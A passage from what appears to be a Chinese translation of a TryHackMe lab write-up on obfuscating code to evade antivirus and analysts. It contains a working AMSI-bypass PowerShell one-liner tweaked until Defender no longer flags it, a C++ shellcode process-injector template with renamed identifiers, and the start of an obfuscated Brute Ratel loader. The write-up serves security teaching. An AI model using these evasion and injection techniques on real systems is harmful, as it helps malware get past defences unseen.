+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span>).GetField(<span class="string">'amsi'</span>+<span class="string">'Init'</span>+<span class="string">'Failed'</span>,<span class="string">'No'</span>+<span class="string">'nPublic,S'</span>+<span class="string">'tatic'</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span> ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> M:\\&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这很有趣，似乎没有任何参数值会导致此警报？ 这必定意味着 Defender 会同时对每个 cmdlet 的存在发出警报，以确定它是恶意代码段。 为了解决这个问题，我们需要将 cmdlet 与代码片段的其余部分分开。 这种技术称为相关代码分离，通常与串联一起出现，我们将在任务 8 中进一步介绍这个概念。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; <span class="variable">$Value</span>=<span class="string">"SetValue"</span></span><br><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span>).GetField(<span class="string">'amsi'</span>+<span class="string">'Init'</span>+<span class="string">'Failed'</span>,<span class="string">'No'</span>+<span class="string">'nPublic,S'</span>+<span class="string">'tatic'</span>).<span class="variable">$Value</span>(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br><span class="line"><span class="built_in">PS</span> M:\\&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功！ 没有更多警报，因此我们现在有一个可以使用的干净片段！ 将此干净的代码片段提交到“<a target="_blank" rel="noopener" href="http://10.10.36.78”并获取标志./">http://10.10.36.78”并获取标志。</a></p>
+<h1 id="Obfuscation’s-Function-for-Analysis-Deception"><a href="#Obfuscation’s-Function-for-Analysis-Deception" class="headerlink" title="Obfuscation’s Function for Analysis Deception"></a>Obfuscation’s Function for Analysis Deception</h1><p>在混淆恶意代码的基本功能后，它可能能够通过软件检测，但仍然容易受到人类分析。 虽然没有进一步的策略就不是安全边界，但分析师和逆向工程师可以深入了解我们的恶意应用程序的功能并停止操作。</p>
+<p>对手可以利用先进的逻辑和数学来创建更复杂、更难以理解的代码来对抗分析和逆向工程。</p>
+<p>有关逆向工程的更多信息，请查看<a target="_blank" rel="noopener" href="https://tryhackme.com/module/malware-analysis">恶意软件分析模块</a>。</p>
+<p>上述白皮书：<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">分层混淆分类</a>，在 <strong>code-element 的其他子层下很好地总结了这些实践层</strong>。 下面是<strong>obfuscating layout</strong> and <strong>obfuscating controls sub-layers</strong>中的分类法涵盖的方法表。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f9e4be87a9801b500d118e2c83e19c01.png" alt="Diagram showing the objectives of the Obfuscating Layer sub-layer: junk codes, separation of related codes, stripping redundant symbols, and meaningless identifiers"></p>
+<table>
+<thead>
+<tr>
+<th><strong>混淆方法</strong></th>
+<th><strong>目的</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>垃圾代码</td>
+<td>添加非功能性的垃圾指令，也称为代码存根</td>
+</tr>
+<tr>
+<td>相关代码的分离</td>
+<td>将相关代码或指令分开，增加程序阅读难度</td>
+</tr>
+<tr>
+<td>剥离冗余符号</td>
+<td>剥离符号信息，例如调试信息或其他符号表</td>
+</tr>
+<tr>
+<td>无意义的标识符</td>
+<td>将有意义的标识符转换为无意义的东西</td>
+</tr>
+<tr>
+<td>隐式控制</td>
+<td>将显式控制指令转换为隐式指令</td>
+</tr>
+<tr>
+<td>基于调度程序的控制</td>
+<td>确定运行时期间要执行的下一个块</td>
+</tr>
+<tr>
+<td>概率控制流</td>
+<td>引入具有相同语义但不同语法的控制流复制</td>
+</tr>
+<tr>
+<td>虚假控制流</td>
+<td>控制流故意添加到程序中但永远不会被执行</td>
+</tr>
+</tbody></table>
+<p>在接下来的任务中，我们将以不可知的格式演示上述几种方法。</p>
+<h1 id="Code-Flow-and-Logic"><a href="#Code-Flow-and-Logic" class="headerlink" title="Code Flow and Logic"></a>Code Flow and Logic</h1><p><strong>控制流</strong>是程序执行的关键组成部分，它将定义程序如何逻辑地进行。 <strong>逻辑</strong>是应用程序控制流最重要的决定因素之一，包含各种用途，例如<strong>if/else语句</strong>或<strong>for循环</strong>。 传统上，程序是自上而下执行的； 当遇到逻辑语句时，会按照该语句继续执行。</p>
+<p>下表列出了在处理控制流或程序逻辑时可能会遇到的一些逻辑语句。</p>
+<table>
+<thead>
+<tr>
+<th><strong>逻辑语句</strong></th>
+<th><strong>目的</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>if/else</td>
+<td>仅当满足条件时才执行，否则将执行不同的代码块</td>
+</tr>
+<tr>
+<td>try/catch</td>
+<td>如果无法处理错误，将尝试执行代码块并捕获它。</td>
+</tr>
+<tr>
+<td>switch 将遵循与 if 语句类似的条件逻辑，但在解析为中断或默认 | 之前，会使用 case 检查几种不同的可能条件。</td>
+<td>switch 将遵循与 if 语句类似的条件逻辑，但在解析为中断或默认之前，会使用 case 检查几种不同的可能条件</td>
+</tr>
+<tr>
+<td>for/while</td>
+<td>for 循环将执行一定数量的条件。 while 循环将执行，直到不再满足条件。</td>
+</tr>
+</tbody></table>
+<p>为了使这个概念具体化，我们可以观察一个示例函数及其相应的 <strong>CFG</strong> (<strong>C</strong>ontrol <strong>F</strong>low <strong>G</strong>raph) 来描述它可能的控制流路径。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">x = <span class="number">10</span> </span><br><span class="line"><span class="keyword">if</span>(x &gt; <span class="number">7</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"This executes"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"This is ignored"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png" alt="Control flow diagram showing two different logical paths"></p>
+<p>这对攻击者意味着什么？ 分析人员可以尝试通过控制流来理解程序的功能； 虽然存在问题，但逻辑和控制流程几乎可以轻松操纵并造成任意混乱。 在处理控制流时，攻击者的目标是引入足够多的晦涩且任意的逻辑来迷惑分析人员，但又不会引入太多的逻辑来引起进一步的怀疑或可能被平台检测为恶意。</p>
+<p>在接下来的任务中，我们将讨论攻击者可以用来迷惑分析师的不同控制流模式。</p>
+<h1 id="Arbitrary-Control-Flow-Patterns"><a href="#Arbitrary-Control-Flow-Patterns" class="headerlink" title="Arbitrary Control Flow Patterns"></a>Arbitrary Control Flow Patterns</h1><p>为了制作<strong>任意控制流模式</strong>，我们可以利用<strong>数学</strong>、<strong>逻辑</strong>和/或其他<strong>复杂算法</strong>将不同的控制流注入到恶意函数中。</p>
+<p>我们可以利用<strong>谓词</strong>来制作这些复杂的逻辑和/或数学算法。 谓词是指输入函数返回 <strong>true</strong> 或 <strong>false</strong> 的决策。 从高层次上分解这个概念，我们可以想到一个类似于 if 语句用来确定是否执行代码块的条件的谓词，如上一个任务中的示例所示。</p>
+<p>将此概念应用于混淆，<strong>不透明谓词</strong>用于控制已知的输出和输入。 论文 <a target="_blank" rel="noopener" href="https://etda.libraries.psu.edu/files/final_submissions/17513">不透明谓词：模糊二进制代码中的攻击和防御</a> 指出，“不透明谓词是其值已知的谓词” 混淆器，但很难推断。 它可以与其他混淆方法（例如垃圾代码）无缝应用，将逆向工程尝试变成艰巨的工作。” 不透明谓词属于分类论文的<strong>虚假控制流</strong>和<strong>概率控制流</strong>方法； 它们可用于向程序任意添加逻辑或重构预先存在的函数的控制流。</p>
+<p>不透明谓词这一主题需要对数学和计算原理有更深入的了解，因此我们不会深入讨论它，但我们会观察一个常见的例子。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png" alt="Control flow diagram showing the various logical paths of the collatz conjecture"></p>
+<p><strong>科拉茨猜想</strong>是一个常见的数学问题，可以用作不透明谓词的示例。 它指出：如果重复两个算术运算，它们将从每个正整数中返回一个。 事实上，我们知道对于已知输入（正整数）它总是会输出一个，这意味着它是一个可行的不透明谓词。 有关 Collatz 猜想的更多信息，请参阅 <a target="_blank" rel="noopener" href="https://mathworld.wolfram.com/CollatzProblem.html">Collatz Problem</a>。 下面是 Collatz 猜想在 Python 中的应用示例。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(x &gt; <span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(x%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">		x=x*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		x=x/<span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">1</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">"hello!"</span>) </span><br></pre></td></tr></tbody></table></figure>
+
+<p>在上面的代码片段中，Collatz 猜想仅在“x &gt; 1”时才会执行其数学运算，结果为“1”或“TRUE”。 根据 Collatz 问题的定义，对于正整数输入，它将始终返回 1，因此如果“x”是大于 1 的正整数，则该语句将始终返回 true。</p>
+<p>为了证明这个不透明谓词的功效，我们可以在右边观察它的<strong>CFG</strong>（<strong>C</strong>ontrol <strong>F</strong>low <strong>G</strong>raph）。 如果这就是解释函数的样子，那么想象一下对于分析师来说，编译函数可能是什么样子。</p>
+<hr>
+<p>使用您在整个任务中积累的知识，将自己置于分析师的位置，并尝试解码下面代码片段的原始函数和输出。</p>
+<p>如果您正确遵循打印语句，将会产生一个您可以提交的标志。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">x = <span class="number">3</span></span><br><span class="line">swVar = <span class="number">1</span></span><br><span class="line">a = <span class="number">112340857612345</span></span><br><span class="line">b = <span class="number">1122135047612359087</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">case_1 = [<span class="string">"T"</span>,<span class="string">"d"</span>,<span class="string">"4"</span>,<span class="string">"3"</span>,<span class="string">"3"</span>,<span class="string">"3"</span>,<span class="string">"e"</span>,<span class="string">"1"</span>,<span class="string">"g"</span>,<span class="string">"w"</span>,<span class="string">"p"</span>,<span class="string">"y"</span>,<span class="string">"8"</span>,<span class="string">"4"</span>]</span><br><span class="line">case_2 = [<span class="string">"1a"</span>,<span class="string">"H"</span>,<span class="string">"3a"</span>,<span class="string">"4a"</span>,<span class="string">"5a"</span>,<span class="string">"3"</span>,<span class="string">"7a"</span>,<span class="string">"8a"</span>,<span class="string">"d"</span>,<span class="string">"10a"</span>,<span class="string">"11a"</span>,<span class="string">"12a"</span>,<span class="string">"!"</span>,<span class="string">"14a"</span>]</span><br><span class="line">case_3 = [<span class="string">"1b"</span>,<span class="string">"2b"</span>,<span class="string">"M"</span>,<span class="string">"4b"</span>,<span class="string">"5b"</span>,<span class="string">"6b"</span>,<span class="string">"c"</span>,<span class="string">"8b"</span>,<span class="string">"9b"</span>,<span class="string">"3"</span>,<span class="string">"11b"</span>,<span class="string">"12b"</span>,<span class="string">"13b"</span>,<span class="string">"14b"</span>]</span><br><span class="line">case_4 = [<span class="string">"1c"</span>,<span class="string">"2c"</span>,<span class="string">"3c"</span>,<span class="string">"{"</span>,<span class="string">"5c"</span>,<span class="string">"6c"</span>,<span class="string">"7c"</span>,<span class="string">"8c"</span>,<span class="string">"9c"</span>,<span class="string">"10c"</span>,<span class="string">"d"</span>,<span class="string">"12c"</span>,<span class="string">"13c"</span>,<span class="string">"14c"</span>]</span><br><span class="line">case_5 = [<span class="string">"1d"</span>,<span class="string">"2d"</span>,<span class="string">"3d"</span>,<span class="string">"4d"</span>,<span class="string">"D"</span>,<span class="string">"6d"</span>,<span class="string">"7d"</span>,<span class="string">"o"</span>,<span class="string">"9d"</span>,<span class="string">"10d"</span>,<span class="string">"11d"</span>,<span class="string">"!"</span>,<span class="string">"13d"</span>,<span class="string">"14d"</span>]</span><br><span class="line">case_6 = [<span class="string">"1e"</span>,<span class="string">"2e"</span>,<span class="string">"3e"</span>,<span class="string">"4e"</span>,<span class="string">"5e"</span>,<span class="string">"6e"</span>,<span class="string">"7e"</span>,<span class="string">"8e"</span>,<span class="string">"9e"</span>,<span class="string">"10e"</span>,<span class="string">"11e"</span>,<span class="string">"12e"</span>,<span class="string">"13e"</span>,<span class="string">"}"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (x &gt; <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">        x = x * <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = x / <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> case_1:</span><br><span class="line">            <span class="keyword">match</span> swVar:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_1[i])</span><br><span class="line">                    a = <span class="number">2</span></span><br><span class="line">                    b = <span class="number">214025</span></span><br><span class="line">                    swVar = <span class="number">2</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_2[i])</span><br><span class="line">                    <span class="keyword">if</span> (a &gt; <span class="number">10</span>):</span><br><span class="line">                        swVar = <span class="number">6</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        swVar = <span class="number">3</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_3[i])</span><br><span class="line">                    b = b + a</span><br><span class="line">                    <span class="keyword">if</span> (b &lt; <span class="number">10</span>):</span><br><span class="line">                        swVar = <span class="number">5</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        swVar = <span class="number">4</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_4[i])</span><br><span class="line">                    b -= b</span><br><span class="line">                    swVar = <span class="number">5</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_5[i])</span><br><span class="line">                    a += a</span><br><span class="line">                    swVar = <span class="number">2</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="built_in">print</span>(case_5[<span class="number">11</span>])</span><br><span class="line">                    <span class="built_in">print</span>(case_6[i])</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            i = i + <span class="number">1</span> </span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Protecting-and-Stripping-Identifiable-Information"><a href="#Protecting-and-Stripping-Identifiable-Information" class="headerlink" title="Protecting and Stripping Identifiable Information"></a>Protecting and Stripping Identifiable Information</h1><p>可识别信息可能是分析人员可以用来剖析和尝试理解恶意程序的最关键组件之一。 通过限制可识别信息的数量（变量、函数名称等），分析人员可以使攻击者更有可能无法重建其原始函数。</p>
+<p>在较高层面上，我们应该考虑三种不同类型的可识别数据：代码结构、对象名称和文件/编译属性。 在这项任务中，我们将分解每个概念的核心概念，并对每个概念的实用方法进行案例研究。</p>
+<hr>
+<h3 id="Object-Names"><a href="#Object-Names" class="headerlink" title="Object Names"></a>Object Names</h3><p>对象名称提供了对程序功能的一些最重要的了解，并且可以揭示函数的确切用途。 分析师仍然可以从函数的行为中解构函数的用途，但如果函数没有上下文，这会困难得多。</p>
+<p>文字对象名称的重要性可能会发生变化，具体取决于语言是<strong>编译</strong>还是<strong>解释</strong>。 如果使用 <strong>Python</strong> 或 <strong>PowerShell</strong> 等解释语言，则所有对象都很重要并且必须进行修改。 如果使用诸如 <strong>C</strong> 或 <strong>C#</strong> 之类的编译语言，则通常只有出现在字符串中的对象才有意义。 任何产生<strong>IO 操作</strong>的函数都可以在字符串中出现对象。</p>
+<p>前面提到的白皮书：<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">分层混淆分类法</a>，在<strong>code-element</strong>层的<strong>下很好地总结了这些实践 无意义的标识符</strong>方法。</p>
+<p>下面我们将观察两个为解释语言和编译语言替换有意义的标识符的基本示例。</p>
+<hr>
+<p>作为编译语言的示例，我们可以观察到用 C++ 编写的进程注入器，它向命令行报告其状态。</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	<span class="built_in">string</span> leaked = <span class="string">"This was leaked in the strings"</span>;</span><br><span class="line"></span><br><span class="line">	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Handle obtained for"</span> &lt;&lt; processHandle;</span><br><span class="line">	remoteBuffer = VirtualAllocEx(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Buffer Created"</span>;</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="keyword">sizeof</span> shellcode, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Process written with buffer"</span> &lt;&lt; remoteBuffer;</span><br><span class="line">	remoteThread = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Closing handle"</span> &lt;&lt; processHandle;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; leaked;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>让我们使用字符串来准确查看编译此源代码时泄漏的内容。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;.\strings.exe <span class="string">"\Injector.exe"</span></span><br><span class="line"></span><br><span class="line">Strings v2.<span class="number">54</span> - Search <span class="keyword">for</span> ANSI and Unicode strings <span class="keyword">in</span> binary images.</span><br><span class="line">Copyright (C) <span class="number">1999</span><span class="literal">-2021</span> Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">&gt;FU</span><br><span class="line">z<span class="string">';</span></span><br><span class="line"><span class="string">z'</span>;</span><br><span class="line">...</span><br><span class="line">[<span class="type">snip</span>]</span><br><span class="line">...</span><br><span class="line">Y_^[</span><br><span class="line"><span class="type">leaked</span></span><br><span class="line"><span class="type">shellcode</span></span><br><span class="line"><span class="number">2</span><span class="type">_</span>^[]</span><br><span class="line"><span class="type">...</span></span><br><span class="line">[<span class="type">snip</span>]</span><br><span class="line"><span class="type">...</span></span><br><span class="line"><span class="type">std</span>::<span class="type">_Adjust_manually_vector_aligned</span></span><br><span class="line"><span class="string">"invalid argument"</span></span><br><span class="line"><span class="built_in">string</span> <span class="type">too</span> <span class="built_in">long</span></span><br><span class="line"><span class="type">This</span> <span class="type">was</span> <span class="type">leaked</span> <span class="type">in</span> <span class="type">the</span> <span class="built_in">string</span><span class="type">s</span></span><br><span class="line"><span class="type">Handle</span> <span class="type">obtained</span> <span class="type">for</span></span><br><span class="line"><span class="type">Buffer</span> <span class="type">Created</span></span><br><span class="line"><span class="type">Process</span> <span class="type">written</span> <span class="type">with</span> <span class="type">buffer</span></span><br><span class="line"><span class="type">Closing</span> <span class="type">handle</span></span><br><span class="line"><span class="type">std</span>::<span class="type">_Allocate_manually_vector_aligned</span></span><br><span class="line"><span class="type">bad</span> <span class="type">allocation</span></span><br><span class="line"><span class="type">Stack</span> <span class="type">around</span> <span class="type">the</span> <span class="type">variable</span> <span class="string">'</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[snip]</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">8@9H9T9X9\\9h9|9</span></span><br><span class="line"><span class="string">:$:(:D:H:</span></span><br><span class="line"><span class="string">@1p1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>请注意，所有 iostream 都被写入字符串，甚至 shellcode 字节数组也被泄漏。 这是一个较小的程序，所以想象一下一个充实且未混淆的程序会是什么样子！</p>
+<p>我们可以删除注释并替换有意义的标识符来解决这个问题。</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> awoler[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE awerfu;</span><br><span class="line">	HANDLE rwfhbf;</span><br><span class="line">	PVOID iauwef;</span><br><span class="line"></span><br><span class="line">	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">	iauwef = VirtualAllocEx(awerfu, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(awerfu, iauwef, awoler, <span class="keyword">sizeof</span> awoler, <span class="literal">NULL</span>);</span><br><span class="line">	rwfhbf = CreateRemoteThread(awerfu, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)iauwef, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(awerfu);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们不应该再有任何可识别的字符串信息，并且程序可以安全地进行字符串分析。</p>
+<hr>
+<p>作为解释语言的示例，我们可以从 <a target="_blank" rel="noopener" href="https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit">BRC4 社区工具包</a>。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Ait1m</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x3d, <span class="number">0</span>x50, <span class="number">0</span>x51, <span class="number">0</span>x57, <span class="number">0</span>x50, <span class="number">0</span>x4e, <span class="number">0</span>x5f, <span class="number">0</span>x50, <span class="number">0</span>x4f, <span class="number">0</span>x2f, <span class="number">0</span>x50, <span class="number">0</span>x57, <span class="number">0</span>x50, <span class="number">0</span>x52, <span class="number">0</span>x4c, <span class="number">0</span>x5f, <span class="number">0</span>x50)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$ahv3I</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x34, <span class="number">0</span>x59, <span class="number">0</span>x38, <span class="number">0</span>x50, <span class="number">0</span>x58, <span class="number">0</span>x5a, <span class="number">0</span>x5d, <span class="number">0</span>x64, <span class="number">0</span>x38, <span class="number">0</span>x5a, <span class="number">0</span>x4f, <span class="number">0</span>x60, <span class="number">0</span>x57, <span class="number">0</span>x50)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Moo5y</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x38, <span class="number">0</span>x64, <span class="number">0</span>x2f, <span class="number">0</span>x50, <span class="number">0</span>x57, <span class="number">0</span>x50, <span class="number">0</span>x52, <span class="number">0</span>x4c, <span class="number">0</span>x5f, <span class="number">0</span>x50, <span class="number">0</span>x3f, <span class="number">0</span>x64, <span class="number">0</span>x5b, <span class="number">0</span>x50)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$ooR5o</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x2e, <span class="number">0</span>x57, <span class="number">0</span>x4c, <span class="number">0</span>x5e, <span class="number">0</span>x5e, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x3b, <span class="number">0</span>x60, <span class="number">0</span>x4d, <span class="number">0</span>x57, <span class="number">0</span>x54, <span class="number">0</span>x4e, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x3e, <span class="number">0</span>x50, <span class="number">0</span>x4c, <span class="number">0</span>x57, <span class="number">0</span>x50, <span class="number">0</span>x4f, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x2c, <span class="number">0</span>x59, <span class="number">0</span>x5e, <span class="number">0</span>x54, <span class="number">0</span>x2e, <span class="number">0</span>x57, <span class="number">0</span>x4c, <span class="number">0</span>x5e, <span class="number">0</span>x5e, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x2c, <span class="number">0</span>x60, <span class="number">0</span>x5f, <span class="number">0</span>x5a, <span class="number">0</span>x2e, <span class="number">0</span>x57, <span class="number">0</span>x4c, <span class="number">0</span>x5e, <span class="number">0</span>x5e)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Reo5o</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x3d, <span class="number">0</span>x60, <span class="number">0</span>x59, <span class="number">0</span>x5f, <span class="number">0</span>x54, <span class="number">0</span>x58, <span class="number">0</span>x50, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x38, <span class="number">0</span>x4c, <span class="number">0</span>x59, <span class="number">0</span>x4c, <span class="number">0</span>x52, <span class="number">0</span>x50, <span class="number">0</span>x4f)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Reib3</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x3d, <span class="number">0</span>x3f, <span class="number">0</span>x3e, <span class="number">0</span>x5b, <span class="number">0</span>x50, <span class="number">0</span>x4e, <span class="number">0</span>x54, <span class="number">0</span>x4c, <span class="number">0</span>x57, <span class="number">0</span>x39, <span class="number">0</span>x4c, <span class="number">0</span>x58, <span class="number">0</span>x50, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x33, <span class="number">0</span>x54, <span class="number">0</span>x4f, <span class="number">0</span>x50, <span class="number">0</span>x2d, <span class="number">0</span>x64, <span class="number">0</span>x3e, <span class="number">0</span>x54, <span class="number">0</span>x52, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x3b, <span class="number">0</span>x60, <span class="number">0</span>x4d, <span class="number">0</span>x57, <span class="number">0</span>x54, <span class="number">0</span>x4e)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Thah8</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x3b, <span class="number">0</span>x60, <span class="number">0</span>x4d, <span class="number">0</span>x57, <span class="number">0</span>x54, <span class="number">0</span>x4e, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x33, <span class="number">0</span>x54, <span class="number">0</span>x4f, <span class="number">0</span>x50, <span class="number">0</span>x2d, <span class="number">0</span>x64, <span class="number">0</span>x3e, <span class="number">0</span>x54, <span class="number">0</span>x52, <span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x39, <span class="number">0</span>x50, <span class="number">0</span>x62, <span class="number">0</span>x3e, <span class="number">0</span>x57, <span class="number">0</span>x5a, <span class="number">0</span>x5f, 